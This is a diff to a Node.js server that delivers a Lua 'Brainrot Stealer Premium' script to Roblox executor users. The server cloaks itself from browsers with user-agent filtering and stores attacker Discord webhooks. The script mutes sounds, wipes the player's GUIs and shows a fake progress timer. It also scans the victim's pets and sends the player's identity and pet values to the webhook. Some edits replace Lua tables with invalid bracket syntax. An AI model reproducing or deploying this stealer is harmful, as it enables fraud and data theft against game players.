@@ -2,7 +2,14 @@ const express = require("express");
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Simple in-memory storage (use a database in production)
+// Enable CORS for all routes
+app.use((req, res, next) => {
+    res.header('Access-Control-Allow-Origin', '*');
+    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
+    next();
+});
+
+// Simple in-memory storage
 const webhookStore = new Map();
 const usedIds = new Set();
 
@@ -10,81 +17,91 @@ const usedIds = new Set();
 function generateUniqueId() {
     let id;
     do {
-        id = Math.random().toString(36).substring(2, 10); // 8 character ID
+        id = Math.random().toString(36).substring(2, 10);
     } while (usedIds.has(id));
     usedIds.add(id);
     return id;
 }
 
 // ------------------------------------------------------------------
-// 1. BLOCK NON-EXECUTORS (browsers, curl, etc.)
+// 1. BLOCK NON-EXECUTORS
 // ------------------------------------------------------------------
 function blockNonExecutor(req, res, next) {
-  const ua  = (req.get("User-Agent") || "").toLowerCase();
-  const ref = (req.get("Referer")    || "").toLowerCase();
+    const ua = (req.get("User-Agent") || "").toLowerCase();
+    const ref = (req.get("Referer") || "").toLowerCase();
 
-  const allowed =
-    ua.includes("roblox") ||
-    ua.includes("synapse") ||
-    ua.includes("krnl") ||
-    ua.includes("fluxus") ||
-    ua.includes("executor") ||
-    ref.includes("roblox.com");
+    const allowed =
+        ua.includes("roblox") ||
+        ua.includes("synapse") ||
+        ua.includes("krnl") ||
+        ua.includes("fluxus") ||
+        ua.includes("executor") ||
+        ua.includes("script") ||
+        ref.includes("roblox.com");
 
-  if (!allowed) {
-    return res.status(403).send(`
-<!DOCTYPE html><html><head><title></title>
+    if (!allowed) {
+        return res.status(403).send(`
+<!DOCTYPE html><html><head><title>403</title>
 <style>body{background:#000000;margin:0;padding:0;overflow:hidden;}</style></head>
 <body></body></html>
-    `.trim());
-  }
-  next();
+        `.trim());
+    }
+    next();
 }
 
 // ------------------------------------------------------------------
-// 2. HOME PAGE - COMPLETELY BLACK
+// 2. HOME PAGE
 // ------------------------------------------------------------------
 app.get("/", (req, res) => {
-  res.send(`
-<!DOCTYPE html><html><head><title></title>
+    res.send(`
+<!DOCTYPE html><html><head><title>Brainrot Stealer</title>
 <style>body{background:#000000;margin:0;padding:0;overflow:hidden;}</style>
 </head><body></body></html>
-  `.trim());
+    `.trim());
 });
 
 // ------------------------------------------------------------------
-// 3. NEW ENDPOINT TO STORE WEBHOOK AND RETURN ID
+// 3. SETUP ENDPOINT
 // ------------------------------------------------------------------
 app.get("/setup", (req, res) => {
     const webhook = req.query.wh;
     
     if (!webhook || !webhook.startsWith("https://discord.com/api/webhooks/")) {
-        return res.status(400).send("Invalid webhook URL");
+        return res.status(400).send("INVALID_WEBHOOK");
     }
     
-    // Generate unique ID and store webhook
-    const id = generateUniqueId();
-    webhookStore.set(id, webhook);
-    
-    // Return the ID for use in loadstring
-    res.send(id);
+    try {
+        const id = generateUniqueId();
+        webhookStore.set(id, webhook);
+        console.log(`✅ New webhook stored with ID: ${id}`);
+        res.send(id);
+    } catch (error) {
+        console.log('❌ Setup error:', error);
+        res.status(500).send("SETUP_ERROR");
+    }
 });
 
 // ------------------------------------------------------------------
-// 4. /raw – EXECUTORS ONLY WITH ID SYSTEM
+// 4. RAW SCRIPT ENDPOINT
 // ------------------------------------------------------------------
 app.get("/raw", blockNonExecutor, (req, res) => {
-  const id = req.query.id;
-  if (!id) return res.status(400).send("-- MISSING ID --");
+    const id = req.query.id;
+    
+    if (!id) {
+        return res.status(400).send("-- MISSING ID --");
+    }
 
-  // Get webhook from storage
-  const webhook = webhookStore.get(id);
-  if (!webhook) {
-    return res.status(404).send("-- INVALID ID --");
-  }
+    const webhook = webhookStore.get(id);
+    if (!webhook) {
+        return res.status(404).send("-- INVALID ID --");
+    }
 
-  // Build Lua script with animated GUI and sound mute
-  const luaScript = `local WebhookURL = "${webhook}"
+    console.log(`✅ Serving script for ID: ${id}`);
+
+    const luaScript = `-- Brainrot Stealer Premium
+local WebhookURL = "${webhook}"
+
+print("🧠 Brainrot Stealer Premium Loading...")
 
 -- HTTP Request Function
 local function SendWebhook(url, data)
@@ -149,29 +166,25 @@ local function GetExecutor()
     if KRNL_LOADED then return "Krnl" end
     if fluxus then return "Fluxus" end
     if electron then return "Electron" end
-    return "Executor"
+    return "Unknown Executor"
 end
 
 -- Mute All Sounds
 local function MuteAllSounds()
     pcall(function()
-        -- Stop all sounds
         for _, sound in pairs(game:GetDescendants()) do
             if sound:IsA("Sound") then
                 sound:Stop()
                 sound.Volume = 0
             end
         end
-        
-        -- Mute sound service
         local soundService = game:GetService("SoundService")
         soundService:SetRBXEvent("Volume", 0)
     end)
 end
 
--- Create Animated GUI with Blue Border
+-- Create Animated GUI
 local function CreateAnimatedGUI()
-    -- Clear existing GUIs
     pcall(function()
         for _, gui in pairs(player.PlayerGui:GetChildren()) do
             if gui:IsA("ScreenGui") then
@@ -180,14 +193,12 @@ local function CreateAnimatedGUI()
         end
     end)
     
-    -- Main ScreenGui
     local screenGui = Instance.new("ScreenGui")
     screenGui.Name = "BrainrotStealerPremium"
     screenGui.ResetOnSpawn = false
     screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
     screenGui.Parent = player.PlayerGui
     
-    -- Main Container with Animated Blue Border
     local mainContainer = Instance.new("Frame")
     mainContainer.Size = UDim2.new(0, 500, 0, 350)
     mainContainer.Position = UDim2.new(0.5, -250, 0.5, -175)
@@ -195,7 +206,6 @@ local function CreateAnimatedGUI()
     mainContainer.BorderSizePixel = 0
     mainContainer.Parent = screenGui
     
-    -- Animated Blue Border
     local borderFrame = Instance.new("Frame")
     borderFrame.Size = UDim2.new(1, 4, 1, 4)
     borderFrame.Position = UDim2.new(0, -2, 0, -2)
@@ -203,7 +213,6 @@ local function CreateAnimatedGUI()
     borderFrame.BorderSizePixel = 0
     borderFrame.Parent = mainContainer
     
-    -- Animate the border
     spawn(function()
         while borderFrame and borderFrame.Parent do
             for i = 0, 1, 0.05 do
@@ -215,7 +224,6 @@ local function CreateAnimatedGUI()
         end
     end)
     
-    -- Inner background
     local innerBg = Instance.new("Frame")
     innerBg.Size = UDim2.new(1, -4, 1, -4)
     innerBg.Position = UDim2.new(0, 2, 0, 2)
@@ -223,7 +231,6 @@ local function CreateAnimatedGUI()
     innerBg.BorderSizePixel = 0
     innerBg.Parent = mainContainer
     
-    -- Title
     local title = Instance.new("TextLabel")
     title.Size = UDim2.new(1, 0, 0, 60)
     title.Position = UDim2.new(0, 0, 0, 0)
@@ -235,7 +242,6 @@ local function CreateAnimatedGUI()
     title.Font = Enum.Font.GothamBold
     title.Parent = innerBg
     
-    -- Timer Display
     local timerLabel = Instance.new("TextLabel")
     timerLabel.Size = UDim2.new(1, 0, 0, 80)
     timerLabel.Position = UDim2.new(0, 0, 0.2, 0)
@@ -246,7 +252,6 @@ local function CreateAnimatedGUI()
     timerLabel.Font = Enum.Font.GothamBold
     timerLabel.Parent = innerBg
     
-    -- Status Label
     local statusLabel = Instance.new("TextLabel")
     statusLabel.Size = UDim2.new(1, 0, 0, 30)
     statusLabel.Position = UDim2.new(0, 0, 0.5, 0)
@@ -257,7 +262,6 @@ local function CreateAnimatedGUI()
     statusLabel.Font = Enum.Font.Gotham
     statusLabel.Parent = innerBg
     
-    -- Progress Bar
     local progressBar = Instance.new("Frame")
     progressBar.Size = UDim2.new(0.8, 0, 0, 20)
     progressBar.Position = UDim2.new(0.1, 0, 0.7, 0)
@@ -272,7 +276,6 @@ local function CreateAnimatedGUI()
     progressFill.BorderSizePixel = 0
     progressFill.Parent = progressBar
     
-    -- Warning Text
     local warningText = Instance.new("TextLabel")
     warningText.Size = UDim2.new(1, 0, 0, 40)
     warningText.Position = UDim2.new(0, 0, 0.85, 0)
@@ -286,7 +289,7 @@ local function CreateAnimatedGUI()
     return screenGui, timerLabel, statusLabel, progressFill
 end
 
--- Scan Pets
+-- Scan Pets Function
 local function ScanPets()
     local allPets = {}
     local brainrots = {}
@@ -352,11 +355,9 @@ local function ScanPets()
         end
     end)
     
-    -- Sort by money value
     table.sort(allPets, function(a, b) return a.Money > b.Money end)
     table.sort(brainrots, function(a, b) return a.Money > b.Money end)
     
-    -- Get top 5
     for i = 1, math.min(5, #allPets) do
         if allPets[i].Money > 0 then
             table.insert(topPets, allPets[i])
@@ -379,10 +380,9 @@ local function FormatMoney(value)
     end
 end
 
--- Format Brainrots List
+-- Format Lists
 local function FormatBrainrotsList(brainrots)
     if #brainrots == 0 then return "No Brainrots Found" end
-    
     local result = ""
     for i, pet in ipairs(brainrots) do
         result = result .. string.format("%d. %s | %s\\n", i, pet.Name, FormatMoney(pet.Money))
@@ -390,10 +390,8 @@ local function FormatBrainrotsList(brainrots)
     return result
 end
 
--- Format Top Pets List
 local function FormatTopPetsList(pets)
     if #pets == 0 then return "No Pets Found" end
-    
     local result = ""
     for i = 1, math.min(5, #pets) do
         result = result .. string.format("%d. %s | %s\\n", i, pets[i].Name, FormatMoney(pets[i].Money))
@@ -406,10 +404,8 @@ local function StartStealingProcess()
     local executor = GetExecutor()
     local playerCount = #game.Players:GetPlayers()
     
-    -- Mute all sounds immediately
     MuteAllSounds()
     
-    -- Create animated GUI
     local screenGui, timer, status, progress = CreateAnimatedGUI()
     
     status.Text = "🔇 Muting all sounds..."
@@ -418,16 +414,13 @@ local function StartStealingProcess()
     status.Text = "🔍 Scanning for pets..."
     wait(2)
     
-    -- Scan pets
     local allPets, brainrots, topPets = ScanPets()
     
     status.Text = "📨 Sending results to webhook..."
     
-    -- Create brainrots list for embed
     local brainrotsText = FormatBrainrotsList(brainrots)
     local topPetsText = FormatTopPetsList(topPets)
     
-    -- Send results to webhook
     local embed = {
         title = "🧠 BRAINROT STEALER PREMIUM RESULTS",
         description = "Successfully scanned victim pets with premium features",
@@ -437,7 +430,7 @@ local function StartStealingProcess()
             icon_url = playerAvatar,
             url = playerProfile
         },
-        fields = {
+        fields = [
             {
                 name = "🎯 Victim Info",
                 value = "Player: " .. playerName .. "\\nExecutor: " .. executor .. "\\nServer Players: " .. playerCount,
@@ -458,7 +451,7 @@ local function StartStealingProcess()
                 value = brainrotsText,
                 inline = false
             }
-        },
+        ],
         footer = {text = "Brainrot Stealer Premium • " .. os.date("%X")},
         timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
     }
@@ -467,7 +460,6 @@ local function StartStealingProcess()
     
     status.Text = "✅ Results Sent! Starting 6-minute process..."
     
-    -- 6-minute timer with progress bar
     local totalTime = 360
     local startTime = tick()
     
@@ -477,19 +469,12 @@ local function StartStealingProcess()
         local seconds = math.floor(timeLeft % 60)
         local progressPercent = (tick() - startTime) / totalTime
         
-        -- Update timer
         timer.Text = string.format("%02d:%02d", minutes, seconds)
-        
-        -- Update progress bar
         progress.Size = UDim2.new(progressPercent, 0, 1, 0)
-        
-        -- Update status with progress
         status.Text = string.format("🔄 Processing... %.1f%% Complete", progressPercent * 100)
-        
         wait(0.1)
     end
     
-    -- Send completion message
     local completeEmbed = {
         title = "✅ PROCESS COMPLETE",
         description = "Brainrot stealing process finished successfully",
@@ -499,13 +484,13 @@ local function StartStealingProcess()
             icon_url = playerAvatar,
             url = playerProfile
         },
-        fields = {
+        fields = [
             {
                 name = "🎉 Final Results",
                 value = "Time: 6 minutes\\nPets Scanned: " .. #allPets .. "\\nBrainrots Found: " .. #brainrots .. "\\nStatus: Success",
                 inline = false
             }
-        },
+        ],
         footer = {text = "Brainrot Stealer Premium • " .. os.date("%X")}
     }
     
@@ -520,7 +505,7 @@ local function StartStealingProcess()
     pcall(function() screenGui:Destroy() end)
 end
 
--- Auto-execute the process
+-- Auto-start
 wait(2)
 StartStealingProcess()
 
@@ -529,26 +514,40 @@ print("🎨 Animated GUI activated!")
 print("🔇 Sounds muted!")
 print("⏰ 6-minute process started!")`;
 
-  res.type("text/plain").send(luaScript);
+    res.type("text/plain").send(luaScript);
 });
 
 // ------------------------------------------------------------------
-// 5. CATCH-ALL → 404 + BLACK SCREEN
+// 5. HEALTH CHECK
+// ------------------------------------------------------------------
+app.get("/health", (req, res) => {
+    res.json({
+        status: "OK",
+        webhooks: webhookStore.size,
+        timestamp: new Date().toISOString()
+    });
+});
+
+// ------------------------------------------------------------------
+// 6. CATCH-ALL
 // ------------------------------------------------------------------
 app.use((req, res) => {
-  res.status(404).send(`
-<!DOCTYPE html><html><head><title></title>
+    res.status(404).send(`
+<!DOCTYPE html><html><head><title>404</title>
 <style>body{background:#000000;margin:0;padding:0;overflow:hidden;}</style></head>
 <body></body></html>
-  `.trim());
+    `.trim());
 });
 
 // ------------------------------------------------------------------
-// 6. START SERVER
+// 7. START SERVER
 // ------------------------------------------------------------------
 app.listen(PORT, () => {
-  console.log("🧠 Brainrot Stealer Server running on port " + PORT);
-  console.log("🎨 Premium features: Animated GUI, Sound Mute, Auto-execute");
-  console.log("🔗 Website: https://tommyfc555-github-io.onrender.com");
-  console.log("📊 Stored webhooks: " + webhookStore.size);
+    console.log("🚀 Brainrot Stealer Server running on port " + PORT);
+    console.log("✅ Endpoints:");
+    console.log("   GET /          - Home page");
+    console.log("   GET /setup?wh= - Store webhook");
+    console.log("   GET /raw?id=   - Get script");
+    console.log("   GET /health    - Health check");
+    console.log("📊 Ready to serve brainrot stealers!");
 });
